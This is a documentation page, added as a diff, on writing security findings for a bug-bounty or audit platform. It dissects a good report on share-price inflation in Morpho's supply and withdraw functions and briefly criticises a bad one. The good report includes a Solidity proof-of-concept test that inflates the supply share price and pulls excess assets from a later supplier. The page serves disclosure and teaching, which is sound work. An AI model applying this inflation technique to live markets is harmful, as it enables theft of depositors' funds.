@@ -1,0 +1,89 @@
+---
+description: >-
+  Explore best practices for submitting security findings with clear examples of
+  good and bad reports to enhance communication in vulnerability assessments.
+---
+
+# 🔸 Examples
+
+Good writing skills are important to communicate complex ideas, ensuring that the reader fully understands the vulnerability's significance and urgency. Below we provide two examples to follow as a guideline when submitting [.](./ "mention").
+
+## Good
+
+A good finding report clearly explains
+
+1. **What** is the issue.
+2. **How / Why** is it happening.
+3. **Where exactly** is the vulnerable code located and which logic does it connect to.
+4. **How to reproduce it** with a **Proof Of Concept.**
+5. **How** it can be **remediated.**
+
+In the image below you will find a finding submission by [cantina.xyz/u/cmichel](https://cantina.xyz/u/cmichel). Lets dissect why this is a good finding and why you should follow this standard.
+
+<figure><img src="../../../.gitbook/assets/image (28).png" alt="Detailed security finding with code and explanation."><figcaption><p>Example of good finding</p></figcaption></figure>
+
+1. Clearly describes **what** the issue.
+
+> The `supply` and `withdraw` functions can increase the supply share price (`totalSupplyAssets / totalSupplyShares`). If a depositor uses the `shares` parameter in `supply` to specify how many assets they want to supply they can be tricked into supplying more assets than they wanted. It's easy to inflate the supply share price by 100x through a combination of a single supply of 100 assets and then withdrawing all shares without receiving any assets in return.
+
+2. Clearly describes **why** is it happening.
+
+> The reason is that in `withdraw` we compute the `assets` to be received as `assets = shares.toAssetsUp(market[id].totalSupplyAssets, market[id].totalSupplyShares);`. Note that `assets` can be zero and the `withdraw` essentially becomes a pure `burn` function.
+
+3. Clearly **points to** the vulnerable line using the [highlighting-code.md](../code-review/highlighting-code.md "mention") feature.
+
+<figure><img src="../../../.gitbook/assets/image (29).png" alt="Smart contract code line highlight."><figcaption><p>Highlighted line of code</p></figcaption></figure>
+
+4. Provides a **Proof Of Concept** for anyone to reproduce and verify the vulnerability.
+
+```solidity
+function testSupplyInflationAttack() public {
+  vm.startPrank(SUPPLIER);
+  loanToken.setBalance(SUPPLIER, 1 * 1e18);
+
+  // 100x the price. in the end we end up with 0 supply and totalAssets = assets supplied here
+  morpho.supply(marketParams, 99, 0, SUPPLIER, "");
+
+  uint256 withdrawals = 0;
+  for (;; withdrawals++) {
+      (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);
+      uint256 shares = (totalSupplyShares + 1e6).mulDivUp(1, totalSupplyAssets + 1) - 1;
+      // burn all of our shares, then break
+      if (shares > totalSupplyShares) {
+          shares = totalSupplyShares;
+      }
+      if (shares == 0) {
+          break;
+      }
+      morpho.withdraw(marketParams, 0, shares, SUPPLIER, SUPPLIER);
+  }
+  (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);
+  console2.log("withdrawals", withdrawals);
+  console2.log("totalSupplyAssets", totalSupplyAssets);
+  console2.log("final share price %sx", (totalSupplyAssets + 1) * 1e6 / (totalSupplyShares + 1e6));
+
+  // without inflation this should mint at initial share price of 1e6, i.e., 1 asset
+  (uint256 returnAssets,) = morpho.supply(marketParams, 0, 1 * 1e6, SUPPLIER, "");
+  console2.log("pulled in assets ", returnAssets);
+}
+```
+
+5. Provides a **remediation** for the client.
+
+> Suppliers should use the `assets` parameter instead of `shares` whenever possible. In the other cases where `shares` must be used, they need to make sure to only approve the max amount they want to spend. Alternatively, consider adding a slippage parameter `maxAssets` that is the max amount of assets that can be supplied and transferred from the user. This attack of inflating the supply share price is especially possible when there are only few shares minted, i.e., at market creation or when an attacker / contracts holds the majority of shares that can be redeemed.
+
+### Competitions Finding Format
+
+For [Competitions](https://cantina.xyz/competitions), please use the **Detailed template** when submitting a finding.
+
+<figure><img src="../../../.gitbook/assets/image (37).png" alt="Vulnerability report template structure."><figcaption></figcaption></figure>
+
+## Bad
+
+The finding below is an example of a bad finding submission.
+
+* The description is generic, nonsensical because it shows lack of understanding of the protocol, does not clearly state the exact problem nor why is it happening.
+* It does not point to the lines of code affected.
+* It does not provide a Proof Of Concept.
+
+<figure><img src="../../../.gitbook/assets/Frame 31.png" alt="Security issue report with severity indicators."><figcaption><p>Example of bad finding</p></figcaption></figure>
